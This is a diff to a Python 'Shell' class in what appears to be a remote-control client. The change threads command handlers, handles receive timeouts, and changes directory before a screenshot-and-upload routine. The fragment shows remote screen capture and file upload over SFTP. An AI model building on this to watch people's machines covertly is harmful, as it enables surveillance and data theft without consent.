@@ -4,6 +4,7 @@
 
 import socket
 import subprocess
+from os import chdir
 from time import sleep
 from queue import Queue
 from . import ssh, sftp, screen
@@ -32,6 +33,8 @@ class Shell(object):
  def listen_recv(self):
   while self.is_alive:
    recv = self.session.recv()
+   if recv == -1: continue # timed out
+   
    if recv:
     with self.lock:
      self.recv_queue.put(recv)
@@ -48,8 +51,8 @@ class Shell(object):
     args = data['args']
     self.display_text(data['args'])
     if code in self.cmds:
-     self.cmds[code](args) 
-      
+     Thread(target=self.cmds[code], args=[args], daemon=True).start()
+           
  def shell(self):
   t1 = Thread(target=self.listen_recv)
   t2 = Thread(target=self.parser)
@@ -102,6 +105,7 @@ class Shell(object):
   self.ftp.send(file)
 
  def screen(self, args):
+  chdir(self.home)
   screen.screenshot()
   self.upload(screen.file)
   screen.clean_up()
